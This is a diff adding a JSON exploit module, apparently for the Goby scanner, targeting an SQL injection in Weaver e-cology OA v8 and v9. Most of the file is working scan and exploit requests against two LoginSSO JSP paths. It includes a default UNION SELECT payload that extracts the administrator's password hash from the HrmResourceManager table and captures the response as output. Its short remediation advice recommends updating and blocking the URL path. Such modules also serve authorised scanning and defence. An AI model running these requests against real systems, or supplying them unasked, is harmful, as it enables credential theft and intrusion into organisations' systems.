@@ -1,0 +1,195 @@
+{
+  "Name": "weaver e-cology oa system front page sql injection",
+  "Description": "weaver e-cology oa system v8 and v9 version have two default url have sql injection vuln ,when attacker give a spical sql payload with the url,it can explode the sysadmin user's password hash or other dangerous effect",
+  "Product": "weaver e-clolgy oa system v8 v9",
+  "Homepage": "https://www.weaver.com.cn/",
+  "DisclosureDate": "2021-05-26",
+  "Author": "adeljck@gmail.com",
+  "GobyQuery": "product=\"Weaver-OA\"",
+  "Level": "3",
+  "Impact": "<p>1.with spical sql payload can explode sysadmin user's password hash</p><p>2.with some other spical(union select) payload and the e-cology table info can get other sensetive info</p>",
+  "Recommandation": "<p>1.update to latest version</p><p>2.ban the url path with a rule in your security product(waf.etc)</p>",
+  "References": [
+    "no public(CNVD-2021-33202 )"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "sql_payload",
+      "type": "input",
+      "value": "%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "Sql Injection",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "OR",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20license%20as%20id%20from%20license",
+        "follow_redirect": false,
+        "header": {
+          "Upgrade-Insecure-Requests": "1",
+          "DNT": "1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "regex",
+            "value": "<code>",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/upgrade/detail.jsp/login/LoginSSO2.jsp?id=1%20UNION%20SELECT%20license%20as%20id%20from%20license",
+        "follow_redirect": false,
+        "header": {
+          "Upgrade-Insecure-Requests": "1",
+          "DNT": "1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "regex",
+            "value": "<code>",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "OR",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/upgrade/detail.jsp/login/LoginSSO.jsp?id=1{{{sql_payload}}}",
+        "follow_redirect": false,
+        "header": {
+          "Upgrade-Insecure-Requests": "1",
+          "DNT": "1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "code",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/upgrade/detail.jsp/login/LoginSSO2.jsp?id=1{{{sql_payload}}}",
+        "follow_redirect": false,
+        "header": {
+          "Upgrade-Insecure-Requests": "1",
+          "DNT": "1",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "code",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": [
+    "SQL Injection",
+    "Disclosure of Sensitive Information"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
